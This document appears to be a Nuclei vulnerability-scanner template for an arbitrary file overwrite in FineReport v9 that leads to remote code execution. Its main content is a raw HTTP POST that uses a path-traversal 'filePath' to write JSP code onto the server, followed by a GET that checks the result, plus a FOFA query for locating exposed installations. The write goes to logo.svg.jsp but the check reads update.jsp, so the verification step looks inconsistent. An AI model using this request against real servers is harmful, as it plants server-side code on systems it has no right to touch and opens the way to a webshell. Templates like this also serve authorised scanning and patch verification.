id: fine-report-v9-file-upload2

info:
  name: FineReport v9 Arbitrary File Overwrite
  author: SleepingBag945
  severity: critical
  description: 由于WebReport V9在安装之后在WebReport目录下存在update.jsp和update1.jsp 因此可以构造payload直接覆盖这两个文件的内容 从而GetShell。构造如下Payload覆盖update.jsp文件内容
  reference:
    - https://blog.csdn.net/lhh134/article/details/135605627
  metadata:
    max-request: 2
    fofa-query: app="帆软-FineReport"
  tags: finereport,fileupload,intrusive,vuln
variables:
  string: '{{rand_base(8, "abc")}}'
  filename: '{{rand_base(8)}}'

http:
  - raw:
      - |
        POST /WebReport/ReportServer HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        sec-ch-ua: \Google Chrome\;v=\89\, \Chromium\;v=\89\, \;Not A Brand\;v=\99\r
        sec-ch-ua-mobile: ?0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=1878B613B8A9CBFF23FE8C72DA653D12; JSESSIONID=CAC281612CF43B2F778028E2942E8AB0
        Content-Type: application/json
        Content-Length: 58634
        Transfer-Encoding: chunked

        {
          "userinfo": "ccccc",
          "123":"",
          "__CONTENT__":"<%out.println(\"HelloWorld\");%>/**/%>",
          "cmd": "design_save_svg",
          "op": "svginit",
          "filePath": "httpchartmapsvg/../../../logo.svg.jsp"
        }
      - |
        GET /WebReport/update.jsp HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200"
          - "contains((body_2), 'HelloWorld')"
        condition: and